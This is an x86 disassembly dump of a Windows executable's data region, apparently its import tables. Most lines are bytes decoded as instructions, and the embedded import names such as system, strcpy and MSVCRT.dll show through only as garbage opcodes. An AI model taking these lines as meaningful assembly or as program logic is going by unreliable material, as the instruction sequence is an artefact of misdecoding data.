  41d4ea:	add    DWORD PTR [eax],eax
	...
  41d4f4:	inc    edx
  41d4f5:	jmp    0xd441d4fb
  41d4fa:	add    DWORD PTR [eax],eax
	...
  41d510:	sbb    cl,bl
  41d512:	add    DWORD PTR [eax],eax
  41d514:	fld    DWORD PTR es:[ecx]
  41d517:	add    BYTE PTR [eax],dh
  41d519:	fld    DWORD PTR [ecx]
  41d51b:	add    BYTE PTR [edx],bh
  41d51d:	fld    DWORD PTR [ecx]
  41d51f:	add    BYTE PTR [edx-0x27],al
  41d522:	add    DWORD PTR [eax],eax
  41d524:	dec    esp
  41d525:	fld    DWORD PTR [ecx]
  41d527:	add    BYTE PTR [eax-0x27],bl
  41d52a:	add    DWORD PTR [eax],eax
  41d52c:	(bad)  
  41d52d:	fld    DWORD PTR [ecx]
  41d52f:	add    BYTE PTR [ecx+ebx*8+0x1],ch
  41d533:	add    BYTE PTR [eax-0x27],bh
  41d536:	add    DWORD PTR [eax],eax
  41d538:	sbb    cl,0x1
  41d53b:	add    BYTE PTR [eax-0x65fffe27],cl
  41d541:	fld    DWORD PTR [ecx]
  41d543:	add    BYTE PTR [eax-0x4dfffe27],ch
  41d549:	fld    DWORD PTR [ecx]
  41d54b:	add    BYTE PTR [ecx+ebx*8-0x2639ffff],bh
  41d552:	add    DWORD PTR [eax],eax
  41d554:	rcr    cl,1
  41d556:	add    DWORD PTR [eax],eax
  41d558:	loopne 0x41d533
  41d55a:	add    DWORD PTR [eax],eax
  41d55c:	jmp    0x1d9:0xf80001d9
  41d563:	add    BYTE PTR [edx+ebx*8],al
  41d566:	add    DWORD PTR [eax],eax
  41d568:	push   cs
  41d569:	fiadd  DWORD PTR [ecx]
  41d56b:	add    BYTE PTR [edx],bl
  41d56d:	fiadd  DWORD PTR [ecx]
  41d56f:	add    BYTE PTR [edx+ebx*8],ah
  41d572:	add    DWORD PTR [eax],eax
  41d574:	fiadd  DWORD PTR cs:[ecx]
  41d577:	add    BYTE PTR [eax],bh
  41d579:	fiadd  DWORD PTR [ecx]
  41d57b:	add    BYTE PTR [eax-0x26],al
  41d57e:	add    DWORD PTR [eax],eax
  41d580:	dec    esi
  41d581:	fiadd  DWORD PTR [ecx]
  41d583:	add    BYTE PTR [eax-0x26],bl
  41d586:	add    DWORD PTR [eax],eax
  41d588:	fiadd  DWORD PTR fs:[ecx]
  41d58b:	add    BYTE PTR [esi-0x26],ch
  41d58e:	add    DWORD PTR [eax],eax
  41d590:	js     0x41d56c
  41d592:	add    DWORD PTR [eax],eax
  41d594:	xchg   dl,bl
  41d596:	add    DWORD PTR [eax],eax
  41d598:	mov    ds,edx
  41d59a:	add    DWORD PTR [eax],eax
  41d59c:	call   0x1da:0xa40001da
  41d5a3:	add    BYTE PTR [esi-0x47fffe26],ch
  41d5a9:	fiadd  DWORD PTR [ecx]
  41d5ab:	add    ah,cl
  41d5ad:	fiadd  DWORD PTR [ecx]
  41d5af:	add    ah,bl
  41d5b1:	fiadd  DWORD PTR [ecx]
  41d5b3:	add    al,ch
  41d5b5:	fiadd  DWORD PTR [ecx]
  41d5b7:	add    dl,dh
  41d5b9:	fiadd  DWORD PTR [ecx]
  41d5bb:	add    ah,bh
  41d5bd:	fiadd  DWORD PTR [ecx]
  41d5bf:	add    BYTE PTR [eax],al
  41d5c1:	add    BYTE PTR [eax],al
  41d5c3:	add    BYTE PTR [edx],dl
  41d5c5:	fild   DWORD PTR [ecx]
  41d5c7:	add    BYTE PTR [eax],dh
  41d5c9:	fild   DWORD PTR [ecx]
  41d5cb:	add    BYTE PTR [eax-0x25],cl
  41d5ce:	add    DWORD PTR [eax],eax
  41d5d0:	push   0x7a0001db
  41d5d5:	fild   DWORD PTR [ecx]
  41d5d7:	add    BYTE PTR [edx-0x57fffe25],cl
  41d5dd:	fild   DWORD PTR [ecx]
  41d5df:	add    dl,al
  41d5e1:	fild   DWORD PTR [ecx]
  41d5e3:	add    dh,dl
  41d5e5:	fild   DWORD PTR [ecx]
  41d5e7:	add    dh,ah
  41d5e9:	fild   DWORD PTR [ecx]
  41d5eb:	add    BYTE PTR [edx],al
  41d5ed:	fadd   QWORD PTR [ecx]
  41d5ef:	add    BYTE PTR [esp+ebx*8],bl
  41d5f2:	add    DWORD PTR [eax],eax
  41d5f4:	sub    al,0xdc
  41d5f6:	add    DWORD PTR [eax],eax
  41d5f8:	cmp    bl,ah
  41d5fa:	add    DWORD PTR [eax],eax
  41d5fc:	dec    esi
  41d5fd:	fadd   QWORD PTR [ecx]
  41d5ff:	add    BYTE PTR [edx-0x24],bl
  41d602:	add    DWORD PTR [eax],eax
  41d604:	data16 fadd QWORD PTR [ecx]
  41d607:	add    BYTE PTR [eax-0x24],bh
  41d60a:	add    DWORD PTR [eax],eax
  41d60c:	mov    bl,ah
  41d60e:	add    DWORD PTR [eax],eax
  41d610:	pushf  
  41d611:	fadd   QWORD PTR [ecx]
  41d613:	add    BYTE PTR [esi-0x3ffffe24],ch
  41d619:	fadd   QWORD PTR [ecx]
  41d61b:	add    ah,cl
  41d61d:	fadd   QWORD PTR [ecx]
  41d61f:	add    al,ah
  41d621:	fadd   QWORD PTR [ecx]
  41d623:	add    ah,dh
  41d625:	fadd   QWORD PTR [ecx]
  41d627:	add    BYTE PTR [esi],al
  41d629:	fld    QWORD PTR [ecx]
  41d62b:	add    BYTE PTR [esi],dl
  41d62d:	fld    QWORD PTR [ecx]
  41d62f:	add    BYTE PTR [ebx*8-0x22c3ffff],ah
  41d636:	add    DWORD PTR [eax],eax
  41d638:	dec    edx
  41d639:	fld    QWORD PTR [ecx]
  41d63b:	add    BYTE PTR [eax-0x23],bl
  41d63e:	add    DWORD PTR [eax],eax
  41d640:	pusha  
  41d641:	fld    QWORD PTR [ecx]
  41d643:	add    BYTE PTR [esi-0x23],ch
  41d646:	add    DWORD PTR [eax],eax
  41d648:	test   ch,bl
  41d64a:	add    DWORD PTR [eax],eax
  41d64c:	mov    ds,ebp
  41d64e:	add    DWORD PTR [eax],eax
  41d650:	sahf   
  41d651:	fld    QWORD PTR [ecx]
  41d653:	add    BYTE PTR [ebp+ebx*8-0x2239ffff],dh
  41d65a:	add    DWORD PTR [eax],eax
  41d65c:	fcmovu st,st(5)
  41d65e:	add    DWORD PTR [eax],eax
  41d660:	out    dx,al
  41d661:	fld    QWORD PTR [ecx]
  41d663:	add    ah,bh
  41d665:	fld    QWORD PTR [ecx]
  41d667:	add    BYTE PTR [eax],cl
  41d669:	fiadd  WORD PTR [ecx]
  41d66b:	add    BYTE PTR [eax],ah
  41d66d:	fiadd  WORD PTR [ecx]
  41d66f:	add    BYTE PTR [edx],dh
  41d671:	fiadd  WORD PTR [ecx]
  41d673:	add    BYTE PTR [edx-0x22],cl
  41d676:	add    DWORD PTR [eax],eax
  41d678:	pop    esp
  41d679:	fiadd  WORD PTR [ecx]
  41d67b:	add    BYTE PTR [esi+ebx*8+0x1],dh
  41d67f:	add    BYTE PTR [edx-0x71fffe22],al
  41d685:	fiadd  WORD PTR [ecx]
  41d687:	add    BYTE PTR [edx+0x1de],ah
  41d68d:	add    BYTE PTR [eax],al
  41d68f:	add    al,al
  41d691:	fiadd  WORD PTR [ecx]
  41d693:	add    dl,cl
  41d695:	fiadd  WORD PTR [ecx]
  41d697:	add    ah,dl
  41d699:	fiadd  WORD PTR [ecx]
  41d69b:	add    al,ah
  41d69d:	fiadd  WORD PTR [ecx]
  41d69f:	add    ah,dh
  41d6a1:	fiadd  WORD PTR [ecx]
  41d6a3:	add    BYTE PTR [eax],al
  41d6a5:	fild   WORD PTR [ecx]
  41d6a7:	add    BYTE PTR [edx],bl
  41d6a9:	fild   WORD PTR [ecx]
  41d6ab:	add    BYTE PTR [edx],ch
  41d6ad:	fild   WORD PTR [ecx]
  41d6af:	add    BYTE PTR [eax],bh
  41d6b1:	fild   WORD PTR [ecx]
  41d6b3:	add    BYTE PTR [eax-0x21],dl
  41d6b6:	add    DWORD PTR [eax],eax
  41d6b8:	fild   WORD PTR fs:[ecx]
  41d6bb:	add    BYTE PTR [esi-0x21],bh
  41d6be:	add    DWORD PTR [eax],eax
  41d6c0:	mov    edi,ds
  41d6c2:	add    DWORD PTR [eax],eax
  41d6c4:	cwde   
  41d6c5:	fild   WORD PTR [ecx]
  41d6c7:	add    BYTE PTR [esi-0x45fffe21],ah
  41d6cd:	fild   WORD PTR [ecx]
  41d6cf:	add    dh,al
  41d6d1:	fild   WORD PTR [ecx]
  41d6d3:	add    dh,dl
  41d6d5:	fild   WORD PTR [ecx]
  41d6d7:	add    dh,ah
  41d6d9:	fild   WORD PTR [ecx]
  41d6db:	add    ah,bh
  41d6dd:	fild   WORD PTR [ecx]
  41d6df:	add    BYTE PTR [eax],cl
  41d6e1:	loopne 0x41d6e4
  41d6e3:	add    BYTE PTR [eax+eiz*8],dl
  41d6e6:	add    DWORD PTR [eax],eax
  41d6e8:	sub    al,ah
  41d6ea:	add    DWORD PTR [eax],eax
  41d6ec:	ds loopne 0x41d6f0
  41d6ef:	add    BYTE PTR [esi-0x20],dl
  41d6f2:	add    DWORD PTR [eax],eax
  41d6f4:	data16 loopne 0x41d6f8
  41d6f7:	add    BYTE PTR [edx-0x20],dh
  41d6fa:	add    DWORD PTR [eax],eax
  41d6fc:	xchg   al,ah
  41d6fe:	add    DWORD PTR [eax],eax
  41d700:	xchg   esp,eax
  41d701:	loopne 0x41d704
  41d703:	add    BYTE PTR [esi-0x47fffe20],ch
  41d709:	loopne 0x41d70c
  41d70b:	add    dl,cl
  41d70d:	loopne 0x41d710
  41d70f:	add    ah,bl
  41d711:	loopne 0x41d714
  41d713:	add    dh,ch
  41d715:	loopne 0x41d718
  41d717:	add    dh,bh
  41d719:	loopne 0x41d71c
  41d71b:	add    BYTE PTR [eax],cl
  41d71d:	loope  0x41d720
  41d71f:	add    BYTE PTR [esi],bl
  41d721:	loope  0x41d724
  41d723:	add    BYTE PTR [edx],dh
  41d725:	loope  0x41d728
  41d727:	add    BYTE PTR [esi-0x1f],al
  41d72a:	add    DWORD PTR [eax],eax
  41d72c:	push   esi
  41d72d:	loope  0x41d730
  41d72f:	add    BYTE PTR [esi-0x1f],ah
  41d732:	add    DWORD PTR [eax],eax
  41d734:	jb     0x41d717
  41d736:	add    DWORD PTR [eax],eax
  41d738:	test   cl,ah
  41d73a:	add    DWORD PTR [eax],eax
  41d73c:	mov    al,ds:0xb60001e1
  41d741:	loope  0x41d744
  41d743:	add    dl,al
  41d745:	loope  0x41d748
  41d747:	add    dh,dl
  41d749:	loope  0x41d74c
  41d74b:	add    BYTE PTR [eax],al
  41d74d:	add    BYTE PTR [eax],al
  41d74f:	add    ah,dh
  41d751:	loope  0x41d754
  41d753:	add    BYTE PTR [edx+eiz*8],al
  41d756:	add    DWORD PTR [eax],eax
  41d758:	adc    al,0xe2
  41d75a:	add    DWORD PTR [eax],eax
  41d75c:	and    ah,dl
  41d75e:	add    DWORD PTR [eax],eax
  41d760:	xor    dl,ah
  41d762:	add    DWORD PTR [eax],eax
  41d764:	ds loop 0x41d768
  41d767:	add    BYTE PTR [edx-0x1e],dl
  41d76a:	add    DWORD PTR [eax],eax
  41d76c:	pusha  
  41d76d:	loop   0x41d770
  41d76f:	add    BYTE PTR [edx-0x1e],bh
  41d772:	add    DWORD PTR [eax],eax
  41d774:	xchg   dl,ah
  41d776:	add    DWORD PTR [eax],eax
  41d778:	cwde   
  41d779:	loop   0x41d77c
  41d77b:	add    BYTE PTR [edx+eiz*8-0x1d47ffff],ah
  41d782:	add    DWORD PTR [eax],eax
  41d784:	int3   
  41d785:	loop   0x41d788
  41d787:	add    dh,dl
  41d789:	loop   0x41d78c
  41d78b:	add    al,ah
  41d78d:	loop   0x41d790
  41d78f:	add    dl,bh
  41d791:	loop   0x41d794
  41d793:	add    BYTE PTR [edx],cl
  41d795:	jecxz  0x41d798
  41d797:	add    BYTE PTR [edx],bl
  41d799:	jecxz  0x41d79c
  41d79b:	add    BYTE PTR [ebx+eiz*8],ah
  41d79e:	add    DWORD PTR [eax],eax
  41d7a0:	xor    al,0xe3
  41d7a2:	add    DWORD PTR [eax],eax
  41d7a4:	inc    eax
  41d7a5:	jecxz  0x41d7a8
  41d7a7:	add    BYTE PTR [esi-0x1d],cl
  41d7aa:	add    DWORD PTR [eax],eax
  41d7ac:	fs jecxz 0x41d7b0
  41d7af:	add    BYTE PTR [esi-0x1d],dh
  41d7b2:	add    DWORD PTR [eax],eax
  41d7b4:	mov    fs,ebx
  41d7b6:	add    DWORD PTR [eax],eax
  41d7b8:	mov    ds:0xb00001e3,al
  41d7bd:	jecxz  0x41d7c0
  41d7bf:	add    dl,al
  41d7c1:	jecxz  0x41d7c4
  41d7c3:	add    dh,cl
  41d7c5:	jecxz  0x41d7c8
  41d7c7:	add    dh,bl
  41d7c9:	jecxz  0x41d7cc
  41d7cb:	add    ah,ch
  41d7cd:	jecxz  0x41d7d0
  41d7cf:	add    BYTE PTR [eax],al
  41d7d1:	in     al,0x1
  41d7d3:	add    BYTE PTR [esi],cl
  41d7d5:	in     al,0x1
  41d7d7:	add    BYTE PTR [edx],ch
  41d7d9:	in     al,0x1
  41d7db:	add    BYTE PTR [esp+eiz*8],bh
  41d7de:	add    DWORD PTR [eax],eax
  41d7e0:	dec    esp
  41d7e1:	in     al,0x1
  41d7e3:	add    BYTE PTR [esi-0x1c],bl
  41d7e6:	add    DWORD PTR [eax],eax
  41d7e8:	push   0xffffffe4
  41d7ea:	add    DWORD PTR [eax],eax
  41d7ec:	jl     0x41d7d2
  41d7ee:	add    DWORD PTR [eax],eax
  41d7f0:	mov    ah,ah
  41d7f2:	add    DWORD PTR [eax],eax
  41d7f4:	cwde   
  41d7f5:	in     al,0x1
  41d7f7:	add    BYTE PTR [esi-0x3ffffe1c],ch
  41d7fd:	in     al,0x1
  41d7ff:	add    al,dl
  41d801:	in     al,0x1
  41d803:	add    dl,ah
  41d805:	in     al,0x1
  41d807:	add    al,dh
  41d809:	in     al,0x1
  41d80b:	add    BYTE PTR [eax],cl
  41d80d:	in     eax,0x1
  41d80f:	add    BYTE PTR [eiz*8-0x1ad5ffff],bl
  41d816:	add    DWORD PTR [eax],eax
  41d818:	ds in  eax,0x1
  41d81b:	add    BYTE PTR [edx-0x1b],cl
  41d81e:	add    DWORD PTR [eax],eax
  41d820:	pop    edx
  41d821:	in     eax,0x1
  41d823:	add    BYTE PTR [esi-0x1b],ch
  41d826:	add    DWORD PTR [eax],eax
  41d828:	jle    0x41d80f
  41d82a:	add    DWORD PTR [eax],eax
  41d82c:	nop
  41d82d:	in     eax,0x1
  41d82f:	add    BYTE PTR [ebp+eiz*8-0x1a55ffff],bl
  41d836:	add    DWORD PTR [eax],eax
  41d838:	mov    eax,0xca0001e5
  41d83d:	in     eax,0x1
  41d83f:	add    dl,bl
  41d841:	in     eax,0x1
  41d843:	add    dh,ah
  41d845:	in     eax,0x1
  41d847:	add    ah,bh
  41d849:	in     eax,0x1
  41d84b:	add    BYTE PTR [esi],cl
  41d84d:	out    0x1,al
  41d84f:	add    BYTE PTR [eax],ch
  41d851:	out    0x1,al
  41d853:	add    BYTE PTR [edx],bh
  41d855:	out    0x1,al
  41d857:	add    BYTE PTR [esi+eiz*8+0x1],cl
  41d85b:	add    BYTE PTR [eax-0x1a],bl
  41d85e:	add    DWORD PTR [eax],eax
  41d860:	push   0x7a0001e6
  41d865:	out    0x1,al
  41d867:	add    BYTE PTR [esi-0x67fffe1a],al
  41d86d:	out    0x1,al
  41d86f:	add    BYTE PTR [edx-0x35fffe1a],dh
  41d875:	out    0x1,al
  41d877:	add    ah,bl
  41d879:	out    0x1,al
  41d87b:	add    dl,ch
  41d87d:	out    0x1,al
  41d87f:	add    al,bh
  41d881:	out    0x1,al
  41d883:	add    BYTE PTR [esi],cl
  41d885:	out    0x1,eax
  41d887:	add    BYTE PTR [esi],bl
  41d889:	out    0x1,eax
  41d88b:	add    BYTE PTR [edx],ch
  41d88d:	out    0x1,eax
  41d88f:	add    BYTE PTR [edx],bh
  41d891:	out    0x1,eax
  41d893:	add    BYTE PTR [edx-0x19],cl
  41d896:	add    DWORD PTR [eax],eax
  41d898:	pop    esp
  41d899:	out    0x1,eax
  41d89b:	add    BYTE PTR [eax-0x19],ch
  41d89e:	add    DWORD PTR [eax],eax
  41d8a0:	jbe    0x41d889
  41d8a2:	add    DWORD PTR [eax],eax
  41d8a4:	xchg   bh,ah
  41d8a6:	add    DWORD PTR [eax],eax
  41d8a8:	cwde   
  41d8a9:	out    0x1,eax
  41d8ab:	add    BYTE PTR [eax-0x45fffe19],ch
  41d8b1:	out    0x1,eax
  41d8b3:	add    al,dl
  41d8b5:	out    0x1,eax
  41d8b7:	add    dh,ah
  41d8b9:	out    0x1,eax
  41d8bb:	add    dh,dh
  41d8bd:	out    0x1,eax
  41d8bf:	add    BYTE PTR [edx],al
  41d8c1:	call   0xe859d8c7
  41d8c6:	add    DWORD PTR [eax],eax
  41d8c8:	and    al,0xe8
  41d8ca:	add    DWORD PTR [eax],eax
  41d8cc:	xor    al,0xe8
  41d8ce:	add    DWORD PTR [eax],eax
  41d8d0:	dec    eax
  41d8d1:	call   0xe897d8d7
  41d8d6:	add    DWORD PTR [eax],eax
  41d8d8:	callw  0xd8dd
  41d8dc:	jp     0x41d8c6
  41d8de:	add    DWORD PTR [eax],eax
  41d8e0:	xchg   al,ch
  41d8e2:	add    DWORD PTR [eax],eax
  41d8e4:	xchg   esi,eax
  41d8e5:	call   0xe8e3d8eb
  41d8ea:	add    DWORD PTR [eax],eax
  41d8ec:	mov    dl,0xe8
  41d8ee:	add    DWORD PTR [eax],eax
  41d8f0:	(bad)  
  41d8f1:	call   0xe913d8f7
  41d8f6:	add    DWORD PTR [eax],eax
  41d8f8:	in     al,0xe8
  41d8fa:	add    DWORD PTR [eax],eax
  41d8fc:	lock call 0xe93fd903
  41d902:	add    DWORD PTR [eax],eax
  41d904:	or     al,0xe9
  41d906:	add    DWORD PTR [eax],eax
  41d908:	sbb    ch,cl
  41d90a:	add    DWORD PTR [eax],eax
  41d90c:	add    BYTE PTR [eax],al
  41d90e:	add    BYTE PTR [eax],al
  41d910:	or     al,0x2
  41d912:	add    BYTE PTR [eax+0x0],al
  41d918:	cmc    
  41d919:	add    BYTE PTR [edi+0x63],bl
  41d91c:	outs   dx,DWORD PTR ds:[esi]
  41d91d:	outs   dx,BYTE PTR ds:[esi]
  41d91e:	je     0x41d992
  41d920:	outs   dx,DWORD PTR ds:[esi]
  41d921:	ins    BYTE PTR es:[edi],dx
  41d922:	data16 jo 0x41d925
  41d925:	add    BYTE PTR [ebx],al
  41d927:	add    al,0x73
  41d929:	jns    0x41d99e
  41d92b:	je     0x41d992
  41d92d:	ins    DWORD PTR es:[edi],dx
  41d92e:	add    BYTE PTR [eax],al
  41d930:	fwait
  41d931:	add    ebp,DWORD PTR [ecx+0x73]
  41d934:	jo     0x41d9a8
  41d936:	imul   ebp,DWORD PTR [esi+0x74],0x61035a00
  41d93d:	je     0x41d9ae
  41d93f:	ins    BYTE PTR es:[edi],dx
  41d940:	add    BYTE PTR [eax],al
  41d942:	jmp    0x7363:0x72747303
  41d949:	jo     0x41d9b9
  41d94b:	add    BYTE PTR [edi+0x73626d03],dh
  41d951:	je     0x41d9c2
  41d953:	ja     0x41d9b8
  41d955:	jae    0x41d957
  41d957:	add    bh,ah
  41d959:	add    esi,DWORD PTR [ebx+0x74]
  41d95c:	jb     0x41d9c1
  41d95e:	outs   dx,DWORD PTR ds:[esi]
  41d95f:	ins    BYTE PTR es:[edi],dx
  41d960:	ins    BYTE PTR es:[edi],dx
  41d961:	add    ch,al
  41d963:	add    esi,DWORD PTR [eax+0x72]
  41d966:	imul   ebp,DWORD PTR [esi+0x74],0xb000066
  41d96d:	add    al,0x74
  41d96f:	outs   dx,DWORD PTR ds:[esi]
  41d970:	ja     0x41d9de
  41d972:	outs   dx,DWORD PTR ds:[esi]
  41d973:	ja     0x41d9da
  41d975:	jb     0x41d977
  41d977:	add    BYTE PTR [esi],al
  41d979:	add    al,0x74
  41d97b:	imul   ebp,DWORD PTR [ebp+0x65],0x36d0000
  41d982:	data16 addr16 gs je 0x41d9ea
  41d987:	add    BYTE PTR [ebx+0x735f5f00],dh
  41d98d:	gs je  0x41d9ef
  41d990:	popa   
  41d991:	jo     0x41da03
  41d993:	pop    edi
  41d994:	je     0x41da0f
  41d996:	jo     0x41d9fd
  41d998:	add    BYTE PTR [eax],al
  41d99a:	mov    al,ds:0x705f5f00
  41d99f:	pop    edi
  41d9a0:	pop    edi
  41d9a1:	ins    WORD PTR es:[edi],dx
  41d9a3:	outs   dx,DWORD PTR ds:[esi]
  41d9a4:	fs add BYTE PTR gs:[eax],al
  41d9a8:	xchg   esp,eax
  41d9a9:	add    ebp,DWORD PTR [ecx+0x73]
  41d9ac:	popa   
  41d9ad:	ins    BYTE PTR es:[edi],dx
  41d9ae:	outs   dx,BYTE PTR ds:[esi]
  41d9af:	jne    0x41da1e
  41d9b1:	add    dl,bh
  41d9b3:	add    esi,DWORD PTR [ebx+0x74]
  41d9b6:	jb     0x41da2c
  41d9b8:	outs   dx,DWORD PTR ds:[esi]
  41d9b9:	imul   eax,DWORD PTR [eax],0x0
  41d9bc:	sbb    al,0x4
  41d9be:	ja     0x41da23
  41d9c0:	jae    0x41da25
  41d9c2:	popa   
  41d9c3:	je     0x41d9c5
  41d9c5:	add    BYTE PTR [ecx+0x74626d03],bh
  41d9cb:	outs   dx,DWORD PTR ds:[esi]
  41d9cc:	ja     0x41da31
  41d9ce:	add    BYTE PTR [eax],al
  41d9d0:	fwait
  41d9d1:	add    BYTE PTR [edi+0x5f],bl
  41d9d4:	jo     0x41da35
  41d9d6:	pop    edi
  41d9d7:	arpl   WORD PTR [edi+0x6d],bp
  41d9da:	ins    DWORD PTR es:[edi],dx
  41d9db:	outs   dx,DWORD PTR ds:[esi]
  41d9dc:	fs add BYTE PTR gs:[eax],al
  41d9e0:	loope  0x41d9e5
  41d9e2:	jae    0x41da57
  41d9e4:	arpl   WORD PTR [ecx+0x6e],sp
  41d9e7:	data16 add BYTE PTR [eax],al
  41d9ea:	fild   DWORD PTR [eax]
  41d9ec:	pop    edi
  41d9ed:	popa   
  41d9ee:	ins    DWORD PTR es:[edi],dx
  41d9ef:	jae    0x41da58
  41d9f1:	pop    edi
  41d9f2:	gs js  0x41da5e
  41d9f5:	je     0x41d9f7
  41d9f7:	add    BYTE PTR [esi+0x6e695f01],al
  41d9fd:	imul   esi,DWORD PTR [esp+esi*2+0x65],0xc8006d72
  41da05:	add    esi,DWORD PTR [eax+0x75]
  41da08:	je     0x41da6d
  41da0a:	push   0xb1007261
  41da0f:	add    ebp,DWORD PTR [edi+ebp*2+0x63]
  41da13:	popa   
  41da14:	ins    BYTE PTR es:[edi],dx
  41da15:	je     0x41da80
  41da17:	ins    DWORD PTR es:[edi],dx
  41da18:	add    BYTE PTR gs:[ecx+0x3],ch
  41da1c:	data16 arpl WORD PTR [edi+ebp*2+0x73],bp
  41da21:	add    BYTE PTR gs:[eax],al
  41da24:	or     eax,0x676e7504
  41da29:	gs je  0x41da8f
  41da2c:	add    BYTE PTR [eax],al
  41da2e:	sub    DWORD PTR [edi+esi*2],eax
  41da31:	arpl   WORD PTR [ebx+0x6e],si
  41da34:	arpl   WORD PTR [eax+0x79],si
  41da37:	add    bh,cl
  41da39:	add    esi,DWORD PTR [edx+0x61]
  41da3c:	outs   dx,BYTE PTR ds:[esi]
  41da3d:	add    BYTE PTR fs:[eax],al
  41da40:	sahf   
  41da41:	add    DWORD PTR [edi+0x69],ebx
  41da44:	jae    0x41dab3
  41da46:	bound  esp,QWORD PTR [edx+0x6c]
  41da49:	gs popa 
  41da4b:	add    BYTE PTR fs:[eax],al
  41da4e:	add    DWORD PTR [ebx+esi*2],eax
  41da51:	ja     0x41dac6
  41da53:	arpl   WORD PTR [ecx+0x6e],sp
  41da56:	data16 add BYTE PTR [ebx+0x77736903],ch
  41da5d:	js     0x41dac3
  41da5f:	imul   esp,DWORD PTR [edi+0x69],0x4280074
  41da66:	ja     0x41dacb
  41da68:	jae    0x41dad8
  41da6a:	arpl   WORD PTR [ebp+0x70],bp
  41da6d:	add    BYTE PTR [esi+0x75736903],bl
  41da73:	jo     0x41dae5
  41da75:	gs jb  0x41da78
  41da78:	push   edx
  41da79:	add    BYTE PTR [edi+0x58],bl
  41da7c:	arpl   WORD PTR [eax+0x74],si
  41da7f:	inc    esi
  41da80:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x1230072
  41da88:	pop    edi
  41da89:	gs js  0x41daf5
  41da8c:	je     0x41da8e
  41da8e:	sbb    BYTE PTR [esi+esi*2],al
  41da91:	jae    0x41db0a
  41da93:	jo     0x41db07
  41da95:	imul   ebp,DWORD PTR [esi+0x74],0xe80066
  41da9c:	pop    edi
  41da9d:	arpl   WORD PTR [ebp+0x78],sp
  41daa0:	imul   esi,DWORD PTR [eax+eax*1+0x0],0x7362035b
  41daa8:	gs popa 
  41daaa:	jb     0x41db0f
  41daac:	push   0x7303e800
  41dab1:	je     0x41db25
  41dab3:	arpl   WORD PTR [eax+0x79],si
  41dab6:	add    BYTE PTR [eax],al
  41dab8:	mov    ch,0x0
  41daba:	pop    edi
  41dabb:	pop    edi
  41dabc:	jae    0x41db23
  41dabe:	je     0x41db35
  41dac0:	jae    0x41db27
  41dac2:	jb     0x41db31
  41dac4:	popa   
  41dac5:	je     0x41db2f
  41dac7:	gs jb  0x41db3c
  41daca:	add    BYTE PTR [eax],al
  41dacc:	jb     0x41dace
  41dace:	pop    edi
  41dacf:	pop    edi
  41dad0:	addr16 gs je 0x41db41
  41dad4:	popa   
  41dad5:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  41dadc:	pop    edi
  41dadd:	add    esp,DWORD PTR [ebx+0x6c]
  41dae0:	gs popa 
  41dae2:	jb     0x41db49
  41dae4:	jb     0x41db58
  41dae6:	add    BYTE PTR [eax],al
  41dae8:	and    DWORD PTR [edi+esi*2],eax
  41daeb:	arpl   WORD PTR [ebx+0x63],si
  41daee:	jo     0x41db69
  41daf0:	add    BYTE PTR [eax],al
  41daf2:	std    
  41daf3:	add    esi,DWORD PTR [ebx+0x74]
  41daf6:	jb     0x41db6c
  41daf8:	outs   dx,DWORD PTR ds:[esi]
  41daf9:	jne    0x41db67
  41dafb:	add    bl,al
  41dafd:	add    esi,DWORD PTR [eax+0x65]
  41db00:	jb     0x41db74
  41db02:	outs   dx,DWORD PTR ds:[esi]
  41db03:	jb     0x41db05
  41db05:	add    BYTE PTR [ebp+0x53],cl
  41db08:	push   esi
  41db09:	inc    ebx
  41db0a:	push   edx
  41db0b:	push   esp
  41db0c:	cs fs ins BYTE PTR es:[edi],dx
  41db0f:	ins    BYTE PTR es:[edi],dx
  41db10:	add    BYTE PTR [eax],al
  41db12:	inc    ecx
  41db13:	add    al,0x53
  41db15:	gs je  0x41db6d
  41db18:	outs   dx,BYTE PTR ds:[esi]
  41db19:	push   0x6c646e61
  41db1e:	gs fs inc ebp
  41db21:	js     0x41db86
  41db23:	gs jo  0x41db9a
  41db26:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  41db2d:	gs jb  0x41db30
  41db30:	jmp    0x6946:0x74654701
  41db37:	ins    BYTE PTR es:[edi],dx
  41db38:	gs inc ecx
  41db3a:	je     0x41dbb0
  41db3c:	jb     0x41dba7
  41db3e:	bound  esi,QWORD PTR [ebp+0x74]
  41db41:	gs jae 0x41db89
  41db44:	js     0x41db87
  41db46:	add    BYTE PTR [eax],al
  41db48:	pop    esp
  41db49:	add    DWORD PTR [esi+0x69],eax
  41db4c:	outs   dx,BYTE PTR ds:[esi]
  41db4d:	fs inc esi
  41db4f:	imul   esi,DWORD PTR [edx+0x73],0x61684374
  41db56:	outs   dx,BYTE PTR ds:[esi]
  41db57:	addr16 gs dec esi
  41db5a:	outs   dx,DWORD PTR ds:[esi]
  41db5b:	je     0x41dbc6
  41db5d:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41db63:	outs   dx,DWORD PTR ds:[esi]
  41db64:	outs   dx,BYTE PTR ds:[esi]
  41db65:	push   edi
  41db66:	add    BYTE PTR [eax],al
  41db68:	mov    ds:0x6c614300,al
  41db6d:	ins    BYTE PTR es:[edi],dx
  41db6e:	dec    esi
  41db6f:	popa   
  41db70:	ins    DWORD PTR es:[edi],dx
  41db71:	gs fs push eax
  41db74:	imul   esi,DWORD PTR [eax+0x65],0xdb000057
  41db7b:	add    cl,BYTE PTR [ecx+0x73]
  41db7e:	push   esi
  41db7f:	popa   
  41db80:	ins    BYTE PTR es:[edi],dx
  41db81:	imul   esp,DWORD PTR [esp+ecx*2+0x6f],0x656c6163
  41db89:	add    BYTE PTR [ebp+0x1],ah
  41db8c:	inc    esi
  41db8d:	imul   ebp,DWORD PTR [esi+0x64],0x7478654e
  41db94:	inc    ebx
  41db95:	push   0x65676e61
  41db9a:	dec    esi
  41db9b:	outs   dx,DWORD PTR ds:[esi]
  41db9c:	je     0x41dc07
  41db9e:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41dba4:	outs   dx,DWORD PTR ds:[esi]
  41dba5:	outs   dx,BYTE PTR ds:[esi]
  41dba6:	add    BYTE PTR [eax],al
  41dba8:	cmp    BYTE PTR [ebx+edx*2],al
  41dbab:	gs je  0x41dc02
  41dbae:	push   0x64616572
  41dbb3:	inc    ebp
  41dbb4:	js     0x41dc1b
  41dbb6:	arpl   WORD PTR [ebp+0x74],si
  41dbb9:	imul   ebp,DWORD PTR [edi+0x6e],0x74617453
  41dbc0:	add    BYTE PTR gs:[esi],bl
  41dbc3:	add    al,BYTE PTR [edi+0x65]
